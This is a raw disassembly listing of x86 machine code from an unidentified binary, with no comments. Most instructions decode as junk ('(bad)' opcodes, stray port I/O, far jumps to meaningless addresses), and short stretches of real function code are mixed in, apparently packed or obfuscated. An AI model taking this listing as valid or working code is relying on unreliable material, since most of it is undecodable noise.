  411306:	arpl   WORD PTR [esi+eiz*8],sp
  411309:	mov    es,WORD PTR [edx]
  41130b:	dec    esi
  41130c:	shr    DWORD PTR [esi+0x6d],1
  41130f:	add    BYTE PTR [ebx+0x54cdfcb0],dl
  411315:	aas    
  411316:	test   DWORD PTR [ebx+0x6aeeb206],ecx
  41131c:	cmp    eax,0x23ec5f73
  411321:	jp     0x41136a
  411323:	sbb    eax,0x96517349
  411328:	addr16 into 
  41132a:	(bad)  
  41132b:	arpl   WORD PTR [edi+0x4b9d4fa4],dx
  411331:	adc    DWORD PTR [ebx],ebx
  411333:	cs and al,0x7d
  411336:	or     eax,0x6de0ab21
  41133b:	add    ch,0x7b
  41133e:	mov    eax,ds:0x7e032338
  411343:	jmp    0x4112c7
  411345:	test   eax,0xb9bd19d8
  41134a:	mov    dh,0x5a
  41134c:	outs   dx,DWORD PTR ds:[esi]
  41134d:	mov    ?,ebx
  41134f:	out    0xe6,eax
  411351:	add    eax,0x848ea580
  411356:	ret    0xa3fc
  411359:	ins    BYTE PTR es:[edi],dx
  41135a:	pop    esp
  41135b:	(bad)  
  41135c:	mov    esi,0xeeb89873
  411361:	fsubr  QWORD PTR [edx-0x4076a547]
  411367:	inc    ecx
  411368:	out    0x77,al
  41136a:	sbb    eax,0xfeb368e2
  41136f:	push   0xd3261042
  411374:	bound  ecx,QWORD PTR [ebx]
  411376:	xchg   BYTE PTR [esi+edi*8],ah
  411379:	clc    
  41137a:	imul   ecx,DWORD PTR [edx-0x7457fabc],0x55
  411381:	or     al,0x3a
  411383:	add    cl,BYTE PTR [edi]
  411385:	test   DWORD PTR [ecx-0x74fffffd],ecx
  41138b:	inc    ebp
  41138c:	clc    
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx-0x3a12ed5f],ecx
  4113db:	push   ebx
  4113dc:	add    DWORD PTR [eax+0x7e],eax
  4113df:	jle    0x4113d2
  4113e1:	jg     0x411461
  4113e3:	jle    0x41142a
  4113e5:	pop    edx
  4113e6:	in     eax,0x1c
  4113e8:	pop    esi
  4113e9:	pop    ds
  4113ea:	jmp    0x598d2db2
  4113ef:	out    0x6,al
  4113f1:	mov    dl,0x7c
  4113f3:	daa    
  4113f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f5:	xor    cl,BYTE PTR [ecx-0x1e]
  4113f8:	dec    esp
  4113f9:	call   FWORD PTR [esi]
  4113fb:	popf   
  4113fc:	mov    dl,0x61
  4113fe:	les    esi,FWORD PTR [edi]
  411400:	push   ebx
  411401:	mov    esp,0xea2dbea8
  411406:	mov    ds:0xae9eabd9,eax
  41140b:	cmp    edi,ebx
  41140d:	cmp    BYTE PTR [ecx-0x77],dh
  411410:	lea    ecx,[edi-0x14]
  411413:	dec    edi
  411414:	test   ebp,ebp
  411416:	loop   0x41147b
  411418:	ins    DWORD PTR es:[edi],dx
  411419:	in     al,0xd9
  41141b:	out    0xe6,al
  41141d:	dec    ebp
  41141e:	mov    al,0x66
  411420:	je     0x4113db
  411422:	push   esp
  411423:	and    DWORD PTR [edi-0x6327c4d9],ecx
  411429:	shr    BYTE PTR [eax],0xf3
  41142c:	dec    ecx
  41142d:	aam    0xb5
  41142f:	pop    ds
  411430:	jnp    0x411411
  411432:	cld    
  411433:	fist   WORD PTR [edi-0x9]
  411436:	lods   eax,DWORD PTR ds:[esi]
  411437:	jmp    0x411444
  411439:	and    esp,ebx
  41143b:	mov    edx,0x9e62073b
  411440:	mov    edi,0xbcb9abb0
  411445:	test   al,0x42
  411447:	fwait
  411448:	lds    esi,FWORD PTR [ecx-0x4d]
  41144b:	add    esp,DWORD PTR [ebp+0x5b]
  41144e:	call   0x76f:0xd9719480
  411455:	hlt    
  411456:	dec    ebp
  411457:	mov    bl,0x91
  411459:	dec    esi
  41145a:	sbb    ah,BYTE PTR [edx]
  41145c:	sbb    al,0xdc
  41145e:	cmp    ch,ah
  411460:	js     0x4114c0
  411462:	jp     0x4114a1
  411464:	or     eax,0x3cd1ee0e
  411469:	fcom   st(4)
  41146b:	add    BYTE PTR [edx],al
  41146d:	lods   al,BYTE PTR ds:[esi]
  41146e:	push   edi
  41146f:	sub    al,0xf6
  411471:	clc    
  411472:	arpl   WORD PTR [eax],cx
  411474:	mov    cl,BYTE PTR [esi]
  411476:	jmp    0xc385b20f
  41147b:	out    0xde,eax
  41147d:	push   ebp
  41147e:	out    0x21,eax
  411480:	dec    eax
  411481:	lock xchg ebp,eax
  411483:	imul   ebx,DWORD PTR [eax+0x1],0x74312ea6
  41148a:	cmp    al,0x4e
  41148c:	push   0xffffff91
  41148e:	call   0x48a079b6
  411493:	jnp    0x4114b1
  411495:	ins    BYTE PTR es:[edi],dx
  411496:	pop    esp
  411497:	aaa    
  411498:	sbb    edx,esi
  41149a:	sbb    DWORD PTR [edi-0x35cbf5a6],ebp
  4114a0:	inc    edi
  4114a1:	or     cl,dl
  4114a3:	test   BYTE PTR [ecx],bl
  4114a5:	pop    edi
  4114a6:	xor    dh,dh
  4114a8:	jmp    0xc47e:0x58ce248a
  4114af:	mov    ?,WORD PTR [esi-0x32]
  4114b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b3:	mov    ch,0x69
  4114b5:	mov    al,BYTE PTR [esi]
  4114b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b8:	xor    BYTE PTR [eax],al
  4114ba:	push   esi
  4114bb:	dec    esp
  4114bc:	xchg   ebx,eax
  4114bd:	pop    ebp
  4114be:	sar    esp,0xd1
  4114c1:	shr    BYTE PTR [ebx-0x66],cl
  4114c4:	jl     0x4114cf
  4114c6:	add    ecx,edx
  4114c8:	sbb    al,0xc5
  4114ca:	out    dx,al
  4114cb:	stc    
  4114cc:	xor    ch,cl
  4114ce:	mov    ebp,0x7b401cf3
  4114d3:	push   ss
  4114d4:	mov    ah,0x9b
  4114d6:	or     esi,DWORD PTR [edx]
  4114d8:	jo     0x41153e
  4114da:	mov    dl,0xe0
  4114dc:	rol    dh,1
  4114de:	mov    ds:0xf20d5dd0,eax
  4114e3:	hlt    
  4114e4:	jns    0x4114a1
  4114e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e7:	or     ecx,DWORD PTR ds:0x92777a15
  4114ee:	imul   esi,DWORD PTR [eax-0x9258bb9],0x11478187
  4114f8:	push   ebx
  4114f9:	xchg   BYTE PTR [ebp-0x5],dl
  4114fc:	sub    al,0xf4
  4114fe:	popa   
  4114ff:	add    ch,BYTE PTR [ebx]
  411501:	or     al,0x51
  411503:	je     0x4114f3
  411505:	and    ah,cl
  411507:	idiv   DWORD PTR ds:0x6cd90fa3
  41150d:	out    0x3e,eax
  41150f:	cmp    cl,BYTE PTR [edi+ebx*8]
  411512:	pop    edx
  411513:	push   es
  411514:	mov    eax,0x3bbaf137
  411519:	les    edx,FWORD PTR [edx+esi*8+0x16]
  41151d:	lods   eax,DWORD PTR ds:[esi]
  41151e:	sub    dl,bl
  411520:	rol    DWORD PTR ds:0x9ac6811e,0x9c
  411527:	(bad)  
  411528:	fdivp  st(6),st
  41152a:	in     eax,dx
  41152b:	sub    al,0x63
  41152d:	push   edi
  41152e:	fcmove st,st(1)
  411530:	test   eax,0xfc72f444
  411535:	loopne 0x411572
  411537:	fwait
  411538:	or     al,0xb3
  41153a:	sbb    al,0x8e
  41153c:	and    DWORD PTR [edi-0x2a],ebx
  41153f:	push   es
  411540:	or     eax,0xf1795031
  411545:	cmp    dl,BYTE PTR [ecx-0x52]
  411548:	ins    BYTE PTR es:[edi],dx
  411549:	into   
  41154a:	sub    eax,0xb10bf08e
  41154f:	mov    dl,0x5d
  411551:	fidivr DWORD PTR [ebx-0x17]
  411554:	repz ror DWORD PTR [bp+di-0x675b],1
  41155a:	add    cl,BYTE PTR [ecx+0x3b]
  41155d:	add    eax,0xf1ddda8
  411562:	(bad)  
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	clc    
  411582:	addr16 mov ch,0xd5
  411585:	add    BYTE PTR [ecx+0x7e],0x7e
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x411542
  41158e:	in     al,dx
  41158f:	xlat   BYTE PTR ds:[ebx]
  411590:	sub    ecx,esi
  411592:	xlat   BYTE PTR ds:[ebx]
  411593:	cmp    ebp,ebx
  411595:	and    al,0x66
  411597:	arpl   WORD PTR [edi],di
  411599:	xchg   edx,eax
  41159a:	xchg   edi,eax
  41159b:	icebp  
  41159c:	sub    dl,BYTE PTR [ebp+0x66e3b57b]
  4115a2:	sub    BYTE PTR [ebp-0x30],dl
  4115a5:	rcl    BYTE PTR [esi+ebp*4-0x208cacb6],cl
  4115ac:	imul   edi,DWORD PTR [esi-0x29c99483],0xffffff9c
  4115b3:	shr    eax,cl
  4115b5:	add    al,0xea
  4115b7:	sub    eax,0xfdcb7a5e
  4115bc:	jmp    0x4f51:0x693e101
  4115c3:	inc    edx
  4115c4:	xchg   ebx,eax
  4115c5:	push   0xc690dc2c
  4115ca:	xchg   edx,eax
  4115cb:	sbb    edi,DWORD PTR [eax]
  4115cd:	ret    0xe893
  4115d0:	mov    BYTE PTR [eax],dh
  4115d2:	add    ah,0x4
  4115d5:	push   0xec0211b8
  4115da:	xchg   edi,eax
  4115db:	xchg   ebp,eax
  4115dc:	imul   esp,DWORD PTR [edi],0xdff3954a
  4115e2:	or     edi,ebx
  4115e4:	fcmove st,st(1)
  4115e6:	and    al,0xdc
  4115e8:	pop    es
  4115e9:	scas   eax,DWORD PTR es:[edi]
  4115ea:	jno    0x411648
  4115ec:	jg     0x41160c
  4115ee:	mov    cl,0xdc
  4115f0:	dec    ebp
  4115f1:	cwde   
  4115f2:	mov    ecx,0x470bfcea
  4115f7:	dec    esi
  4115f8:	and    al,0x8a
  4115fa:	adc    DWORD PTR [edi+0x4d2fb2ae],edx
  411600:	and    al,0x69
  411602:	add    al,0x34
  411604:	adc    al,0x84
  411606:	or     eax,0xe4dde296
  41160b:	loopne 0x411689
  41160d:	jno    0x411643
  41160f:	(bad)  
  411610:	mov    al,0xaa
  411612:	jg     0x41165e
  411614:	push   es
  411615:	and    edi,esi
  411617:	ja     0x41160b
  411619:	ror    DWORD PTR [esi-0x3a],1
  41161c:	test   DWORD PTR [ebx-0x23397736],esi
  411622:	cmc    
  411623:	hlt    
  411624:	dec    esp
  411625:	cwde   
  411626:	ror    esp,1
  411628:	push   esp
  411629:	mov    BYTE PTR [eax],dl
  41162b:	mov    ah,0x77
  41162d:	gs aas 
  41162f:	fnstsw WORD PTR [edi-0x51]
  411632:	outs   dx,BYTE PTR ds:[esi]
  411633:	pop    edx
  411634:	push   ds
  411635:	dec    ebp
  411636:	lea    edi,[ebp-0xaafc846]
  41163c:	imul   esi,DWORD PTR [esi],0xda70b34b
  411642:	gs xchg edx,eax
  411644:	jae    0x4115e9
  411646:	fs ss ja 0x41164a
  41164a:	loop   0x411652
  41164c:	(bad)  
  41164d:	pop    esp
  41164e:	ins    DWORD PTR es:[edi],dx
  41164f:	add    edx,DWORD PTR [esi]
  411651:	pop    ss
  411652:	add    edi,DWORD PTR [ecx+esi*2+0x3b]
  411656:	mov    ebp,0x769ee469
  41165b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41165c:	test   al,0x40
  41165e:	add    al,BYTE PTR [ebx+0x215fbb19]
  411664:	stos   BYTE PTR es:[edi],al
  411665:	add    DWORD PTR [ebp-0x2c],esp
  411668:	test   edx,ebp
  41166a:	mov    eax,ds:0x94de601
  41166f:	outs   dx,BYTE PTR ds:[esi]
  411670:	stc    
  411671:	jnp    0x4116e3
  411673:	dec    ebx
  411674:	sbb    eax,0x101266dd
  411679:	mov    eax,ds:0xf1bd5714
  41167e:	sub    BYTE PTR [ebx-0x59a239c5],bl
  411684:	mov    ebp,0xbd2ca288
  411689:	mov    ds:0x6a014b4e,al
  41168e:	dec    ebx
  41168f:	add    edi,eax
  411691:	jne    0x4116a2
  411693:	pop    ss
  411694:	jns    0x411620
  411696:	stos   BYTE PTR es:[edi],al
  411697:	mov    ecx,0x35a45ef8
  41169c:	xchg   ebx,eax
  41169d:	pop    edx
  41169e:	es retf 
  4116a0:	sbb    al,0xda
  4116a2:	mul    BYTE PTR [ebp-0x3a]
  4116a5:	das    
  4116a6:	leave  
  4116a7:	int    0xfa
  4116a9:	repnz stos BYTE PTR es:[edi],al
  4116ab:	jnp    0x41169c
  4116ad:	push   0x3c655b6f
  4116b2:	dec    esp
  4116b3:	ficomp DWORD PTR [eax+0x1be15de0]
  4116b9:	or     al,0x54
  4116bb:	mov    eax,ds:0x70a07f57
  4116c0:	xor    BYTE PTR [edx+0x2bc2919f],al
  4116c6:	ss fwait
  4116c8:	mov    ds:0x66f0b076,eax
  4116cd:	and    BYTE PTR [ecx+0x1b],0xc2
  4116d1:	cwde   
  4116d2:	shr    BYTE PTR [edi+0x8],1
  4116d5:	xor    ecx,esi
  4116d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d8:	rol    BYTE PTR [edx-0x4a],0x5d
  4116dc:	inc    edx
  4116dd:	repz popa 
  4116df:	or     BYTE PTR [edx+0x4e],dl
  4116e2:	sub    eax,0xd801a49a
  4116e7:	(bad)  
  4116e8:	and    edx,DWORD PTR [edi-0x5960fb33]
  4116ee:	jge    0x411726
  4116f0:	stc    
  4116f1:	es cmp al,0x60
  4116f4:	repz adc al,0x37
  4116f7:	or     al,BYTE PTR [edx+0x292ff535]
  4116fd:	mov    ecx,0xc12119b3
  411702:	pop    edi
  411703:	jae    0x41168a
  411705:	xchg   edi,eax
  411706:	mov    edi,ebx
  411708:	repnz in al,0x2f
  41170b:	or     ecx,DWORD PTR [ebx-0x39fcefb3]
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x3fab318
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411781
  41178e:	dec    esi
  41178f:	(bad)  
  411790:	adc    eax,0x42a5c169
  411795:	adc    DWORD PTR [ecx-0x4b],esi
  411798:	xor    BYTE PTR ds:0x2e29b288,ah
  41179e:	ror    BYTE PTR [ebx-0x6ea9720],1
  4117a4:	scas   al,BYTE PTR es:[edi]
  4117a5:	sbb    eax,0x452f904f
  4117ab:	push   ecx
  4117ac:	stos   DWORD PTR es:[edi],eax
  4117ad:	and    DWORD PTR [edx+eax*8-0x5a],esi
  4117b1:	jmp    0x3327c752
  4117b6:	xor    BYTE PTR [eax],bl
  4117b8:	gs mov ebp,0xe77476ac
  4117be:	inc    esp
  4117bf:	mov    bh,0x57
  4117c1:	data16 test BYTE PTR cs:[eax+0x384fc909],cl
  4117c9:	xor    DWORD PTR [ebx+ebp*4],esp
  4117cc:	mov    bh,0x58
  4117ce:	repnz add ah,BYTE PTR [edi-0x6a7fc609]
  4117d5:	or     eax,0xcc7d2ca9
  4117da:	add    eax,0xc3d51c19
  4117df:	repz push ecx
  4117e1:	ja     0x41177a
  4117e3:	outs   dx,DWORD PTR ds:[esi]
  4117e4:	mov    edx,DWORD PTR es:[edx]
  4117e7:	in     al,0xf6
  4117e9:	daa    
  4117ea:	nop
  4117eb:	inc    esp
  4117ec:	xchg   ch,bh
  4117ee:	adc    al,0x4d
  4117f0:	inc    DWORD PTR [edi+0x2af30b23]
  4117f6:	dec    edi
  4117f7:	and    dl,ch
  4117f9:	pop    ss
  4117fa:	cmp    al,0xb6
  4117fc:	add    dl,ah
  4117fe:	pop    ds
  4117ff:	mov    ah,0x72
  411801:	mov    bl,0xea
  411803:	cwde   
  411804:	cwde   
  411805:	popa   
  411806:	and    ch,BYTE PTR [edi+0x76dfff39]
  41180c:	sbb    ah,BYTE PTR [esi+eax*4+0x28e5fd3e]
  411813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411814:	inc    eax
  411815:	fcom   QWORD PTR [edx]
  411817:	cli    
  411818:	(bad)  
  411819:	fcomi  st,st(7)
  41181b:	lahf   
  41181c:	mov    dl,0xee
  41181e:	mov    ds:0xd128bfe4,al
  411823:	icebp  
  411824:	cmp    edx,DWORD PTR [esp+ecx*2]
  411827:	outs   dx,DWORD PTR ds:[esi]
  411828:	stc    
  411829:	ins    DWORD PTR es:[edi],dx
  41182a:	call   eax
  41182c:	push   cs
  41182d:	aas    
  41182e:	push   0x71
  411830:	jecxz  0x41185f
  411832:	push   ss
  411833:	cdq    
  411834:	xchg   esi,eax
  411835:	jp     0x411817
  411837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411838:	push   eax
  411839:	loope  0x4117ed
  41183b:	pop    esi
  41183c:	cmp    DWORD PTR [eax+ebx*1],edx
  41183f:	in     al,0xcf
  411841:	das    
  411842:	cdq    
  411843:	sar    DWORD PTR [ebp+0xd],0x44
  411847:	sbb    bl,BYTE PTR [edi]
  411849:	xor    BYTE PTR [eax],al
  41184b:	es pop ecx
  41184d:	pop    esi
  41184e:	hlt    
  41184f:	in     eax,dx
  411850:	cmp    BYTE PTR [edx],0x56
  411853:	mov    ds:0xa9721e69,al
  411858:	stos   DWORD PTR es:[edi],eax
  411859:	sbb    ch,BYTE PTR [eax+0x3d]
  41185c:	out    dx,eax
  41185d:	sub    eax,0x138e3064
  411862:	fbstp  TBYTE PTR [ecx]
  411864:	(bad)  
  411865:	or     edi,DWORD PTR [ecx+esi*2]
  411868:	js     0x411846
  41186a:	rcr    BYTE PTR ds:0xfb4c4024,cl
  411870:	push   ss
  411871:	cmp    eax,0xcaed0afb
  411876:	xchg   ebp,eax
  411877:	into   
  411878:	pushf  
  411879:	scas   eax,DWORD PTR es:[edi]
  41187a:	loopne 0x4117fc
  41187c:	push   esi
  41187d:	mov    fs,WORD PTR [edx+eax*1-0x19]
  411881:	out    dx,al
  411882:	sar    BYTE PTR ds:0xe12b53e4,1
  411888:	ds push ebp
  41188a:	je     0x4118a9
  41188c:	jb     0x4118da
  41188e:	bnd js 0x411829
  411891:	imul   ecx,edx,0x15
  411894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411895:	sbb    ecx,ebx
  411897:	pop    ebx
  411898:	jo     0x411851
  41189a:	or     al,0x82
  41189c:	xchg   edi,eax
  41189d:	rol    BYTE PTR [ecx],0x24
  4118a0:	and    eax,0x2728f6fe
  4118a5:	in     eax,dx
  4118a6:	jl     0x411880
  4118a8:	push   edx
  4118a9:	data16 bnd js 0x41188f
  4118ad:	jb     0x41187b
  4118af:	fistp  DWORD PTR [edx-0x4a]
  4118b2:	pop    esi
  4118b3:	call   0x860c:0x5cdc1da7
  4118ba:	repz pop edx
  4118bc:	imul   edx,DWORD PTR [edx],0x58
  4118bf:	mov    dh,0x5b
  4118c1:	iret   
  4118c2:	iret   
  4118c3:	aam    0x1
  4118c5:	mov    ecx,DWORD PTR [esi-0x7dd4ef05]
  4118cb:	or     DWORD PTR [ecx],edx
  4118cd:	das    
  4118ce:	fwait
  4118cf:	jne    0x41189c
  4118d1:	add    eax,0x784ece88
  4118d6:	inc    esi
  4118d7:	xor    ecx,DWORD PTR [ecx+0x20]
  4118da:	scas   al,BYTE PTR es:[edi]
  4118db:	fist   DWORD PTR [esi-0x6611bc97]
  4118e1:	int    0xe4
  4118e3:	mov    dh,0xd0
  4118e5:	shr    BYTE PTR ds:[edi-0x31],0x43
  4118ea:	sbb    al,0xa5
  4118ec:	nop
  4118ed:	js     0x4118a0
  4118ef:	add    BYTE PTR [ecx],bl
  4118f1:	jmp    0x4118ec
  4118f3:	or     BYTE PTR [ebx-0x6994289b],0x5b
  4118fa:	out    0xc,eax
  4118fc:	clc    
  4118fd:	retf   
  4118fe:	add    al,0x72
  411900:	push   ds
  411901:	std    
  411902:	inc    ecx
  411903:	fwait
  411904:	rcl    DWORD PTR ds:0x985da395,1
  41190a:	lds    edi,FWORD PTR [ebx]
  41190c:	push   ecx
  41190d:	std    
  41190e:	pop    ecx
  41190f:	mov    fs,WORD PTR [ecx-0x16]
  411912:	or     BYTE PTR [edx-0x136fd89f],ah
  411918:	xlat   BYTE PTR ds:[ebx]
  411919:	outs   dx,DWORD PTR ds:[esi]
  41191a:	aaa    
  41191b:	leave  
  41191c:	cmp    eax,0xf3d23438
  411921:	fmul   QWORD PTR [esi]
  411923:	js     0x4118fd
  411925:	gs aaa 
  411927:	sbb    edi,ebp
  411929:	ja     0x4119a4
  41192b:	cmp    ah,dl
  41192d:	pop    es
  41192e:	mov    dh,0x8e
  411930:	pop    ss
  411931:	mov    ebp,0x77e246f2
  411936:	adc    al,0xc5
  411938:	xchg   edi,eax
  411939:	xchg   edi,eax
  41193a:	fadd   DWORD PTR [eax+ebx*4]
  41193d:	ficom  WORD PTR [edi-0x192737e1]
  411943:	lods   al,BYTE PTR ds:[esi]
  411944:	mov    ds:0x3ca7bc27,eax
  411949:	and    al,0xe5
  41194b:	retf   0xcd2e
  41194e:	mov    ds:0xd883c955,eax
  411953:	push   esp
  411954:	or     edx,DWORD PTR [esi+0x16a7d5fa]
  41195a:	mov    ds:0xabb9c284,al
  41195f:	or     eax,0xd8e634a2
  411964:	push   ds
  411965:	mov    bl,0x7e
  411967:	adc    eax,0xb8ff6d2e
  41196c:	cmp    cl,BYTE PTR [ecx]
  41196e:	call   0xfec8dda2
  411973:	mov    bl,0x74
  411975:	and    edx,DWORD PTR [edi+0x6f]
  411978:	imul   esp,edx,0xf
  41197b:	cmp    bh,BYTE PTR ds:0xbe058105
  411981:	mov    dh,0x6b
  411983:	retf   
  411984:	jbe    0x411932
  411986:	daa    
  411987:	cmp    edi,eax
  411989:	and    esp,DWORD PTR fs:[edx+0x5d]
  41198d:	xor    al,ah
  41198f:	iret   
  411990:	push   edi
  411991:	(bad)  
  411992:	push   cs
  411993:	sbb    eax,0xc7e0e8be
  411998:	xor    al,0x18
  41199a:	pop    esi
  41199b:	ins    DWORD PTR es:[edi],dx
  41199c:	int    0x34
  41199e:	test   DWORD PTR [esi-0x2a7b3932],edi
  4119a4:	xchg   ecx,eax
  4119a5:	and    ah,al
  4119a7:	ror    BYTE PTR [esi-0x62],0x63
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433723,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0xe5
  411a13:	bndstx [eiz*1+0x107e7e4d],(bad)
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x411a32
  411a1f:	stos   DWORD PTR es:[edi],eax
  411a20:	push   edi
  411a21:	lods   al,BYTE PTR ds:[esi]
  411a22:	push   cs
  411a23:	push   esp
  411a24:	sub    eax,edi
  411a26:	ss clc 
  411a28:	hlt    
  411a29:	stos   BYTE PTR es:[edi],al
  411a2a:	pop    esp
  411a2b:	inc    esi
  411a2c:	pop    ebx
  411a2d:	push   ss
  411a2e:	repz adc BYTE PTR [esi],al
  411a31:	loopne 0x411a74
  411a33:	(bad)  
  411a34:	shl    DWORD PTR [eax-0x517ef690],1
  411a3a:	or     al,dh
  411a3c:	imul   edx,DWORD PTR [eax],0x9
  411a3f:	aam    0x95
  411a41:	and    al,0xb1
  411a43:	xor    al,0x20
  411a45:	stc    
  411a46:	jb     0x411ac3
  411a48:	sar    cl,0xe7
  411a4b:	loop   0x411aaf
  411a4d:	dec    esp
  411a4e:	cmp    eax,0x81b5dc95
  411a53:	lahf   
  411a54:	out    0x5e,al
  411a56:	push   ds
  411a57:	nop
  411a58:	aam    0x7f
  411a5a:	fsub   DWORD PTR [esi+0x294a86f9]
  411a60:	mov    DWORD PTR fs:[ecx-0x719e755],eax
  411a67:	pop    eax
  411a68:	test   DWORD PTR [ebp+0x52],esp
  411a6b:	lock sbb al,0x61
  411a6e:	out    dx,eax
  411a6f:	xchg   ecx,eax
  411a70:	test   al,0xfa
  411a72:	cmc    
  411a73:	mov    WORD PTR [ecx*4-0x17ff6f14],?
  411a7a:	or     BYTE PTR [ebx-0x2a41e6ef],0xed
  411a81:	pop    esp
  411a82:	adc    BYTE PTR [edi],ch
  411a84:	jl     0x411a31
  411a86:	xor    DWORD PTR [ebp-0x472e544b],ebp
  411a8c:	jmp    0x996e:0x36c9a9d5
  411a93:	jecxz  0x411ade
  411a95:	out    0x95,eax
  411a97:	mov    esp,0x8fe57753
  411a9c:	xchg   DWORD PTR [edx-0x48],ebx
  411a9f:	adc    eax,0xa6de6a49
  411aa4:	sbb    eax,0xad86d65e
  411aa9:	sti    
  411aaa:	dec    ebx
  411aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aac:	mov    al,ds:0xb7aa6496
  411ab1:	div    DWORD PTR [eax+edi*2+0x34]
  411ab5:	imul   edx,DWORD PTR [edi],0x9ebc74f7
  411abb:	les    ebp,FWORD PTR [edi]
  411abd:	mov    edx,0xd559e16f
  411ac2:	outs   dx,DWORD PTR ds:[esi]
  411ac3:	mov    edi,0x4aeac43a
  411ac8:	cmc    
  411ac9:	nop
  411aca:	ins    DWORD PTR es:[edi],dx
  411acb:	in     al,0x99
  411acd:	sub    esi,ecx
  411acf:	xchg   ecx,eax
  411ad0:	jmp    FWORD PTR [eax-0x4664cd8f]
  411ad6:	adc    al,0xa1
  411ad8:	jne    0x411a5f
  411ada:	sar    BYTE PTR [ebp-0x22b0df56],cl
  411ae0:	sti    
  411ae1:	jl     0x411aee
  411ae3:	xchg   edx,eax
  411ae4:	cmp    eax,0xbffcb1a9
  411ae9:	mov    bl,0x4f
  411aeb:	inc    edx
  411aec:	jl     0x411a82
  411aee:	sbb    DWORD PTR ds:0x7b1cdd24,esp
  411af4:	dec    edx
  411af5:	pop    ecx
  411af6:	push   ds
  411af7:	sbb    dh,0xc3
  411afa:	dec    ecx
  411afb:	(bad)  
  411afc:	icebp  
  411afd:	rcr    BYTE PTR [edx+0x63],cl
  411b00:	jbe    0x411abf
  411b02:	push   0xccc149dd
  411b07:	jg     0x411b1e
  411b09:	cmp    DWORD PTR ss:[eax],0xb2421a9e
  411b10:	adc    dl,0xf
  411b13:	push   0x36
  411b15:	ja     0x411afb
  411b17:	and    al,0x5d
  411b19:	pop    eax
  411b1a:	(bad)  
  411b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b1d:	in     eax,0x17
  411b1f:	sbb    eax,0xb538f0d9
  411b24:	mov    dl,0xdf
  411b26:	sahf   
  411b27:	call   0x847a:0x3d910254
  411b2e:	add    ch,bh
  411b30:	mov    BYTE PTR [ebp-0x71],bl
  411b33:	mul    DWORD PTR [eax+0x1]
  411b36:	jle    0x411b0d
